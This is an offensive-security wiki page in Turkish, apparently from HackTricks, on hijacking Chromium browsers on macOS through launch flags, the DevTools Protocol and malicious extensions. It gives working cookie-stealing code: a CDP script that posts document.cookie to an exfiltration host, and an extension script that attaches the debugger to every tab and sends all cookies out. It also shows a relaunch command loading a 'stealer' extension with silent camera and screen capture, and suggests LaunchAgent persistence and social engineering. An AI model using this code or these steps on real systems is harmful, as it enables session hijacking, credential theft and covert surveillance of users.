# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Chromium-tabanlı tarayıcılar (Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi ve Opera) aynı komut satırı anahtarlarını, tercih dosyalarını ve DevTools otomasyon arabirimlerini kullanır. macOS üzerinde GUI erişimi olan herhangi bir kullanıcı mevcut bir tarayıcı oturumunu sonlandırıp hedefin yetkileriyle çalışan rastgele bayraklar, uzantılar veya DevTools uç noktaları ile yeniden açabilir.

#### macOS'te özelleştirilmiş bayraklarla Chromium başlatma

macOS her Chromium profilinde tek bir UI örneği tutar, bu yüzden enstrümantasyon genellikle tarayıcının zorla kapatılmasını gerektirir (örneğin `osascript -e 'tell application "Google Chrome" to quit'`). Saldırganlar genellikle uygulama paketini değiştirmeden argüman enjekte edebilmek için `open -na "Google Chrome" --args <flags>` ile yeniden başlatır. Bu komutu bir kullanıcı LaunchAgent'ı (`~/Library/LaunchAgents/*.plist`) veya oturum açma kancası içine almak, müdahale edilmiş tarayıcının yeniden başlatma/oturum kapatma sonrası yeniden açılmasını garanti eder.

#### `--load-extension` Bayrağı

`--load-extension` bayrağı unpacked uzantıları otomatik yükler (virgülle ayrılmış yollar). Meşru uzantıları engellemek ve yalnızca payload'unuzun çalışmasını zorlamak için `--disable-extensions-except` ile birlikte kullanın. Kötü amaçlı uzantılar `debugger`, `webRequest` ve `cookies` gibi yüksek etkiye sahip izinler isteyerek DevTools protokollerine saptama yapabilir, CSP başlıklarını değiştirebilir, HTTPS'i zayıflatabilir veya tarayıcı başladığı anda oturum materyallerini sızdırabilir.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Bayrakları

Bu seçenekler Chrome DevTools Protocol (CDP)'ü TCP veya bir pipe üzerinden açarak dış araçların tarayıcıyı kontrol etmesine izin verir. Google, bu arabirimin geniş çapta infostealer suistimaline uğradığını gözlemledi ve Chrome 136 (March 2025) itibarıyla, varsayılan profil için bu anahtarlar `--user-data-dir` ile standart dışı bir konum kullanılmadıkça yok sayılmaktadır. Bu, gerçek profillerde App-Bound Encryption uyguluyor, ancak saldırganlar hâlâ yeni bir profil oluşturarak kurbanı içine kimlik doğrulaması yapmaya zorlayabilir (phishing/triage yardımı) ve CDP aracılığıyla çerezleri, tokenları, cihaz güven durumu veya WebAuthn kayıtlarını toplayabilir.

#### `--user-data-dir` Bayrağı

Bu bayrak tarayıcı profilinin tamamını (History, Cookies, Login Data, Preference dosyaları vb.) saldırganca kontrol edilen bir yola yönlendirir. Modern Chrome sürümlerini `--remote-debugging-port` ile birleştirirken zorunludur ve ayrıca müdahale edilmiş profili izole tutarak güvenlik istemlerini devre dışı bırakan, uzantıları otomatik yükleyen ve varsayılan şemaları değiştiren önceden doldurulmuş `Preferences` veya `Secure Preferences` dosyalarını bırakmanıza imkan verir.

#### `--use-fake-ui-for-media-stream` Bayrağı

Bu seçenek kamera/mikrofon izin istemini atlar, böylece `getUserMedia` çağıran herhangi bir sayfa hemen erişim alır. Bunu `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` veya CDP `Browser.grantPermissions` komutları gibi bayraklarla birleştirerek ses/görüntü yakalama, masa paylaşımı veya WebRTC izin kontrollerini kullanıcı etkileşimi olmadan sessizce gerçekleştirebilirsiniz.

## Uzaktan Hata Ayıklama ve DevTools Protokolü Suistimali

Chrome özel bir `--user-data-dir` ve `--remote-debugging-port` ile yeniden başlatıldıktan sonra, CDP üzerinden (ör. `chrome-remote-interface`, `puppeteer` veya `playwright` ile) bağlanıp yüksek yetkili iş akışlarını otomatikleştirebilirsiniz:

- **Cookie/session theft:** `Network.getAllCookies` ve `Storage.getCookies` HttpOnly değerleri bile döndürür; çünkü CDP bunları disk erişiminin normalde engelleyeceği durumlarda bile çalışan tarayıcıdan çözmesini ister.
- **Permission tampering:** `Browser.grantPermissions` ve `Emulation.setGeolocationOverride` kamera/mikrofon istemlerini atlamanıza (özellikle `--use-fake-ui-for-media-stream` ile birlikte) veya konuma dayalı güvenlik kontrollerini sahtelemeye olanak tanır.
- **Keystroke/script injection:** `Runtime.evaluate` aktif sekme içinde keyfi JavaScript çalıştırır; bu, kimlik bilgilerini çekme, DOM'u değiştirme veya gezinmeyi atlasa bile devam eden persistence beacon'ları enjekte etme gibi işlemleri mümkün kılar.
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` ve `Fetch.enable` kimlikli istek/yanıtları gerçek zamanlı olarak disk artefaktlarına dokunmadan yakalar ve dışarı aktarır.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Because Chrome 136 varsayılan profilde CDP'yi engellediği için, kurbanın mevcut `~/Library/Application Support/Google/Chrome` dizinini bir staging yoluna kopyala/yapıştır yapmak artık şifre çözülmüş çerezleri vermez. Bunun yerine, kullanıcıyı enstrümante edilmiş profilde kimlik doğrulaması yapmaya sosyal mühendislikle yönlendir (ör. "helpful" support session) veya CDP tarafından kontrol edilen network hook'lar aracılığıyla transit halindeki MFA token'larını yakala.

## Extension-Based Injection via Debugger API

2023'teki "Chrowned by an Extension" araştırması, `chrome.debugger` API'sini kullanan kötü amaçlı bir extension'ın herhangi bir taba bağlanıp `--remote-debugging-port` ile aynı DevTools yetkilerini elde edebileceğini gösterdi. Bu, orijinal izolasyon varsayımlarını (extensions kendi bağlamında kalır) yıkar ve şunları mümkün kılar:

- `Network.getAllCookies`/`Fetch.getResponseBody` ile sessiz çerez ve kimlik bilgisi hırsızlığı.
- Site izinlerinin (kamera, mikrofon, konum) değiştirilmesi ve güvenlik interstitial'larının atlanması; phishing sayfalarının Chrome diyaloglarını taklit etmesine izin verir.
- `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` veya `Security.handleCertificateError`'ı programatik olarak yöneterek TLS uyarıları, indirmeler veya WebAuthn istemlerinin yol üzerindeki değiştirilmesi.

Extension'ı kullanıcı etkileşimi gerekmeyecek şekilde `--load-extension`/`--disable-extensions-except` ile yükleyin. API'yi silahlandıran minimal bir background script şöyle görünür:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Eklenti ayrıca `Debugger.paused` olaylarına abone olarak JavaScript değişkenlerini okuyabilir, inline script'leri patchleyebilir veya gezinme sırasında kalan özel breakpoints bırakabilir. Her şey kullanıcının GUI oturumu içinde çalıştığı için Gatekeeper ve TCC tetiklenmez; bu da yöntemi kullanıcı bağlamında zaten yürütme elde etmiş malware için ideal kılar.

### Tools

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Chromium başlatmalarını payload extensions ile otomatikleştirir ve etkileşimli CDP hook'larını açığa çıkarır.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operatörleri için trafik interception ve browser instrumentation'a odaklanan benzer araç.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Bir `--remote-debugging-port` örneği çalışır duruma geldiğinde Chrome DevTools Protocol dökümlerini (cookies, DOM, permissions) scriptlemek için Node.js kütüphanesi.

### Example
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Daha fazla örnek için araç bağlantılarına bakın.

## Referanslar

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
